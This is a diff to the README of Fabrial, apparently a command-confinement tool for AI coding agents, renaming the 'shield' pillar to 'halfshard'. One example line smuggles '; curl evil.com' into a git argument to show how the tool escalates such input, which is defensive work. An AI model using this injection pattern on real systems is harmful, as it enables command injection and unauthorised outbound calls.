@@ -84,7 +84,7 @@ Every major use case for Fabrial is backed by dedicated, task-oriented recipes i
 | **Real-Time Circuit Breaker Killswitch** | Instantly terminate compromised process trees upon security alerts:<br/>`fabrial circuit-breaker status && fabrial circuit-breaker trip` | [Guide](docs/use-cases/04-circuit-breaker-killswitch.md) |
 | **IDE & AI Coding Agent Integration** | Seamlessly hook Fabrial into Claude Code CLI, Cursor, and Antigravity:<br/>`fabrial integrate antigravity --global` | [Guide](docs/use-cases/05-ide-sidecar-integration.md) |
 | **Dynamic Tier Escalation & Fuzzing Confinement** | Automatically escalate ambiguous parameters, subshells, and differential fuzzing payloads to Tier 2 microVMs:<br/>`fabrial run -- git log -n 1 "; curl evil.com"` | [Guide](docs/use-cases/06-dynamic-tier-escalation.md) |
-| **Optional Pillar Discovery & Fail-Closed Enforcement** | 3-State smart discovery for optional local pillars (`shield`, `stormcage`): invisible when absent, auto-wired when installed, fail-closed (`exit 126`) when `require_shield` / `require_stormcage` is set:<br/>`fabrial doctor` / `fabrial session launch` | [Guide](docs/use-cases/07-optional-pillar-discovery.md) |
+| **Optional Pillar Discovery & Fail-Closed Enforcement** | 3-State smart discovery for optional local pillars (`halfshard`, `stormcage`): invisible when absent, auto-wired when installed, fail-closed (`exit 126`) when `require_halfshard` / `require_stormcage` is set:<br/>`fabrial doctor` / `fabrial session launch` | [Guide](docs/use-cases/07-optional-pillar-discovery.md) |
 
 ---
 
@@ -228,7 +228,7 @@ default_tier: 1
 
 # Optional fail-closed enforcement for local optional pillars (default: false)
 # When true, Fabrial exits 126 if the binary is missing, unexecutable, or unhealthy.
-require_shield: false
+require_halfshard: false
 require_stormcage: false
 
 # Tier 1: Fast Kernel Confinement via Airlock (<15ms cold start)
